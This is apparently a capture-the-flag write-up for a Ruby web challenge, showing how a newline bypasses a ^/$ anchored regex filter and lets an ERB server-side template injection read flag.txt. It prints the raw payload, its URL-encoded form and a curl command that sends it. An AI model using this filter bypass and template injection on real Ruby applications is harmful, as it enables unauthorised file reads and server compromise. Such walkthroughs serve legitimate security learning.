## Hello Everyone
How are you doing guys! Hopefully you are doing great!
Today we will be doing Neonity.

## Enumeration

Before downloading any files, I prefer to understand what I'm dealing with. This is my personal approach: I usually 
start with web challenges by interacting with the website. Next, I examine the deployment stack (Dockerfile, config 
files, etc.) for any useful information. Finally, I review the source code

It looks like a single-page application (no links or navigation) with a simple form that POSTs to / to neonify the entered 
text. Running a quick test with "Hello World" works as expected.

This is likely some type of template injection. However, entering "hello.sh" triggers a "Malicious Input Detected" message. 
It seems there is backend validation, and even a simple . breaks it. It might not be as straightforward as I initially thought.

## Source Code

Time to dive into some code and see what we’re working with!

After thoroughly examining the source code, I observed two key points:

  The neon parameter that is POSTed is passed into the template (potential for injection).
  There is a regex validation for neon that only permits alphanumeric characters and spaces.

This challenge will require a dual approach: executing a Server-Side Template Injection (SSTI) and bypassing the validation. 
The following code snippet shows the validation that needs to be bypassed.

## Exploitaion

There are numerous examples online for Server-Side Template Injection (SSTI) and Ruby in general. However, before we 
can use SSTI to read the flag.txt file, we need to bypass the regex validation. After some research, it appears that 
using ^ and $ within regex in Ruby can be problematic. Knowing that 
the regex can be bypassed with newlines, we can start looking for an exploit to read flag.txt.

```shell
   <%= File.open('flag.txt').read %> # Read file
```
Easy enough, but we have to url encode out payload, and it going to look like 

```shell
   %3C%25%3D%20File.open%28%27flag.txt%27%29.read%20%25%3E
```
What’s I really like about this challenge, is that it is one of those exploits that can be run directly in your browser. 
No need for any special tools! Although, I still prefer to use curl ;)

```shell
   # deliberate newline in console as `\n` fails to parse
   curl -d 'neon=a
   %3C%25%3D%20File.open%28%27flag.txt%27%29.read%20%25%3E' <ip>:<port>
```

Yeah, it was that easy! Cheers
Hopefully you have learned something new  
Good bye :)
